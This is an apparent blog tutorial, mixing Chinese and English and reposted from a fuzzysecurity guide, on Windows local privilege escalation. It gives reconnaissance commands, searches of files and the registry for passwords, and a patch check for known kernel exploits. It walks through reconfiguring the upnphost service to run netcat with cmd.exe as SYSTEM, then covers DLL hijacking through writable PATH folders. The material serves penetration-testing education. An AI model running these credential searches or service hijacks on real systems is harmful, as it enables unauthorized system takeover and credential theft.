---
title: Windows Privilege Escalation Fundamentals
date: 2019-07-25 19:38:05
tags: [Windows]
categories: [Network Security]
---

Windows Privilege Escalation Fundamentals

[Windows Privilege Escalation Fundamentals](http://www.fuzzysecurity.com/tutorials/16.html)


终极目标：获取系统权限(system)

### 信息收集

#### 主机与用户信息

```
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

hostname

echo %username%

net users

net user user1
```

#### 网络信息

```
ipconfig /all

route print

arp -a
#arp -A displays the ARP (Address Resolution Protocol) cache table for all available interfaces.

netstat -ano

# The netsh firewall commands are only available from XP SP2 and upwards.
netsh firewall show state

netsh firewall show config
```

#### 启动项、进程、服务、驱动

```
schtasks /query /fo list /v

tasklist /svc
tasklist /m

#启动服务
net start

#驱动信息 
#This can be useful sometimes as some 3rd party drivers, even by reputable companies, contain more holes
than Swiss cheese. This is only possible because ring0 exploitation lies outside most peoples expertise.

driverquery
```

### 强大的wmic

Any version of XP **did not** allow access to WMIC from a low privileged account. 
Contrary, default installations of Windows 7 Professional and Windows 8 Enterprise allowed low privilege users to use WMIC and query the operating system without modifying any settings. 

原作者编写的一个使用wmic获取系统信息的批处理：[here](http://www.fuzzysecurity.com/tutorials/files/wmic_info.rar)

wmic_info.bat
```
for /f "delims=" %%A in ('dir /s /b %WINDIR%\system32\*htable.xsl') do set "var=%%A"

wmic process get CSName,Description,ExecutablePath,ProcessId /format:"%var%" >> out.html
wmic service get Caption,Name,PathName,ServiceType,Started,StartMode,StartName /format:"%var%" >> out.html
wmic USERACCOUNT list full /format:"%var%" >> out.html
wmic group list full /format:"%var%" >> out.html
wmic nicconfig where IPEnabled='true' get Caption,DefaultIPGateway,Description,DHCPEnabled,DHCPServer,IPAddress,IPSubnet,MACAddress /format:"%var%" >> out.html
wmic volume get Label,DeviceID,DriveLetter,FileSystem,Capacity,FreeSpace /format:"%var%" >> out.html
wmic netuse list full /format:"%var%" >> out.html
wmic qfe get Caption,Description,HotFixID,InstalledOn /format:"%var%" >> out.html
wmic startup get Caption,Command,Location,User /format:"%var%" >> out.html
wmic PRODUCT get Description,InstallDate,InstallLocation,PackageCache,Vendor,Version /format:"%var%" >> out.html
wmic os get name,version,InstallDate,LastBootUpTime,LocalDateTime,Manufacturer,RegisteredUser,ServicePackMajorVersion,SystemDirectory /format:"%var%" >> out.html
wmic Timezone get DaylightName,Description,StandardName /format:"%var%" >> out.html
```

### 寻找可以利用的漏洞
收集信息的目的是利用信息，找到可以利用的漏洞，提权、隐藏自己。纯粹的收集信息是徒劳的。

#### 首先，我们要查看系统补丁安装情况。



```
wmic qfe get caption, description, hotfixid, InstalledOn
```

重要的提权漏洞编号：
KiTrap0D (KB979682)  
MS11-011 (KB2393802)  
MS10-059 (KB982799)  
MS10-021 (KB979683)  
MS11-080 (KB2592799)

[windows-kernel-exploits Windows平台提权漏洞集合](https://github.com/SecWiki/windows-kernel-exploits)

[https://github.com/WindowsExploits/Exploits](https://github.com/WindowsExploits/Exploits)

[https://github.com/AusJock/Privilege-Escalation](https://github.com/AusJock/Privilege-Escalation)

```
systeminfo>micropoor.txt&(for %i in ( KB979682 KB2393802 KB982799 KB979683 KB2592799) do @type micropoor.txt|@find /i "%i"|| @echo %i you can fuck)&del /f /q /a micropoor.txt
```

#### 应用程序敏感信息

有些配置文件会包含各种key、password，这些信息可能很有价值

```
c:\sysprep.inf
c:\sysprep\sysprep.xml
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml
```

另外可以通过Groups.xml来获取命令和密码。工具[Get-GPPPassword.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1)


一个关键的注册表项，`AlwaysInstallElevated`， 如果这个被启用，那么任何权限的用户都可以以`NT AUTHORITY\SYSTEM`的权限来安装`.msi`程序。

```
# This will only work if both registry keys contain "AlwaysInstallElevated" with DWORD values of 1.

C:\Windows\system32> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
C:\Windows\system32> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
```

当然，我们可以直接在系统中搜索，可能包含密码信息的文件：

```
# The command below will search the file system for file names containing certain keywords. You can
specify as many keywords as you wish.

C:\Windows\system32> dir /s *pass* == *cred* == *vnc* == *.config*

# Search certain file types for a keyword, this can generate a lot of output.

C:\Windows\system32> findstr /si password *.xml *.ini *.txt

# Similarly the two commands below can be used to grep the registry for keywords, in this case "password".

C:\Windows\system32> reg query HKLM /f password /t REG_SZ /s
C:\Windows\system32> reg query HKCU /f password /t REG_SZ /s
```

### 提升权限

```
# We can use sc to query, configure and manage windows services.
sc qc Spooler
```

使用accesschk查看服务、目录、注册表等的权限。
```
# We can see the permissions that each user level has, you can also use "accesschk.exe -ucqv *" to list
all services.
accesschk.exe -ucqv Spooler
```

Accesschk can automatically check if we have write access to a Windows service with a certain user level. Generally as a low privilege user we will want to check for "Authenticated Users". Make sure to check which user groups you user belongs to, "Power Users" for example is considered a low privilege user group (though it is not widely used).

```
# This is on Windows 8.

C:\Users\b33f\tools\Sysinternals> accesschk.exe -uwcqv "Authenticated Users" *
No matching objects found.

# On a default Windows XP SP0 we can see there is a pretty big security fail.

C:\> accesschk.exe -uwcqv "Authenticated Users" *
RW SSDPSRV
        SERVICE_ALL_ACCESS
RW upnphost
        SERVICE_ALL_ACCESS
		
C:\> accesschk.exe -ucqv SSDPSRV

SSDPSRV

  RW NT AUTHORITY\SYSTEM
        SERVICE_ALL_ACCESS
  RW BUILTIN\Administrators
        SERVICE_ALL_ACCESS
  RW NT AUTHORITY\Authenticated Users
        SERVICE_ALL_ACCESS
  RW BUILTIN\Power Users
        SERVICE_ALL_ACCESS
  RW NT AUTHORITY\LOCAL SERVICE
        SERVICE_ALL_ACCESS

C:\> accesschk.exe -ucqv upnphost

upnphost

  RW NT AUTHORITY\SYSTEM
        SERVICE_ALL_ACCESS
  RW BUILTIN\Administrators
        SERVICE_ALL_ACCESS
  RW NT AUTHORITY\Authenticated Users
        SERVICE_ALL_ACCESS
  RW BUILTIN\Power Users
        SERVICE_ALL_ACCESS
  RW NT AUTHORITY\LOCAL SERVICE
        SERVICE_ALL_ACCESS
```

This issue was later resolved with the introduction of XP SP2, however on SP0&SP1 it can be used as a universal local privilege escalation vulnerability. By reconfiguring the service we can let it run any binary of our choosing with SYSTEM level privileges.

Let's have a look how this is done in practise. In this case the service will execute netcat and open a reverse shell with SYSTEM level privileges. Other options are certainly possible.

```
C:\> sc qc upnphost

[SC] GetServiceConfig SUCCESS

SERVICE_NAME: upnphost
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\WINDOWS\System32\svchost.exe -k LocalService
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Universal Plug and Play Device Host
        DEPENDENCIES       : SSDPSRV
        SERVICE_START_NAME : NT AUTHORITY\LocalService
		
C:\> sc config upnphost binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
[SC] ChangeServiceConfig SUCCESS

C:\> sc config upnphost obj= ".\LocalSystem" password= ""
[SC] ChangeServiceConfig SUCCESS

C:\> sc qc upnphost

[SC] GetServiceConfig SUCCESS

SERVICE_NAME: upnphost
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Universal Plug and Play Device Host
        DEPENDENCIES       : SSDPSRV
        SERVICE_START_NAME : LocalSystem
		
C:\> net start upnphost
```

Elevating privileges by exploiting weak folder permissions


DLL的加载顺序：
```
You can see the DLL search order on 32-bit systems below:
1 - The directory from which the application loaded
2 - 32-bit System directory (C:\Windows\System32)
3 - 16-bit System directory (C:\Windows\System)
4 - Windows directory (C:\Windows)
5 - The current working directory (CWD)
6 - Directories in the PATH environment variable (system then user)
```

```
# When executing any of the sysinternals tools for the first time the user will be presented with a GUI
pop-up to accept the EULA. This is obviously a big problem, however we can add an extra command line flag
to automatically accept the EULA.

accesschk.exe /accepteula ... ... ...

# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\

# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
```

关于DLL劫持的详细介绍可以参考：[Elevating privileges by exploiting weak folder permissions](http://www.greyhathacker.net/?p=738)

原作者写的一个判断可以利用的文件夹的powershell脚本：[folderperm.ps1](http://www.greyhathacker.net/docs/folderperm.zip)

```
# Author : Parvez Anwar (@parvezghh)
# Date   : 17/11/13
#
# powershell.exe -executionpolicy bypass -file folderperm.ps1

$numofpaths  = 0
$countcopies = 0
$filetocopy  = "testfile.txt"

$myarray = (gi env:path).value.split(';')

Write-Host "" 
Write-Host "[i] Number of folder paths :" $myarray.count

# If the last path entry ends in semi-colon
if ($myarray[$myarray.count-1] -eq "")
{
   $numofpaths = $myarray.count - 2
}
else
{
   $numofpaths = $myarray.count - 1
}

New-Item $filetocopy -type file | Out-Null

$FileExists = (Test-Path $filetocopy)

if (!($FileExists)) 
{
    Write-Host "[i] Dummy test file used to test access was not outputted:" $filetocopy
    exit
}

Write-Host "[i] Copying and removing test file to path folders where access is granted"

for($i=0; $i -le $numofpaths; $i++)
{
 if (Test-Path -Path $myarray[$i])
 {
    Copy-Item $filetocopy $myarray[$i] -errorAction SilentlyContinue -errorVariable errors

    if ($errors.count -le 0)
    {
        Write-Host -foregroundColor Green "      Access granted:" $myarray[$i] 
        $countcopies = $countcopies + 1
        $filetoremove = $myarray[$i] + "\" + $filetocopy
        Remove-Item $filetoremove
    }
    else
    {
       Write-Host -foregroundColor Red "      Access denied :" $myarray[$i] 
    }
 }
 else
 {
    Write-Host -foregroundColor Blue "      Folder missing:" $myarray[$i] 
 }
}
Remove-Item $filetocopy 
```

可以利用的系统服务调用的dll
```
Vulnerable Windows Services
Here are Windows Services that have been found to be vulnerable and could be exploited on Windows 7 (32/64)

IKE and AuthIP IPsec Keying Modules (IKEEXT)                 – wlbsctrl.dll
Windows Media Center Receiver Service (ehRecvr)              – ehETW.dll
Windows Media Center Scheduler Service (ehSched)             – ehETW.dll

The Windows Media Center Services startup type is set to manual and status not started and will only give us only Network service privileges so I cannot see it to being much use especially with its limited privileges. It can however be started temporarily via certain scheduled tasks.

schtasks.exe /run /I /TN “\Microsoft\Windows\Media Center\mcupdate”
schtasks.exe /run /I /TN “\Microsoft\Windows\Media Center\MediaCenterRecoveryTask”
schtasks.exe /run /I /TN “\Microsoft\Windows\Media Center\ActivateWindowsSearch”

A quick check on Windows XP has shown that these Services are vulnerable

Automatic Updates (wuauserv)                               – ifsproxy.dll
Remote Desktop Help Session Manager (RDSessMgr)            – SalemHook.dll
Remote Access Connection Manager (RasMan)                  – ipbootp.dll
Windows Management Instrumentation (winmgmt)               – wbemcore.dll

Other Services that might be installed are also vulnerable

Audio Service (STacSV)                                  – SFFXComm.dll SFCOM.DLL 
Intel(R) Rapid Storage Technology (IAStorDataMgrSvc)    – DriverSim.dll
Juniper Unified Network Service(JuniperAccessService)   – dsLogService.dll
Encase Enterprise Agent                                 – SDDisk.dll 

No dll hijacking vulnerabilities were found on a clean default installation of Windows 8 OS (64) so another good reason to start migrating to Windows 8.
```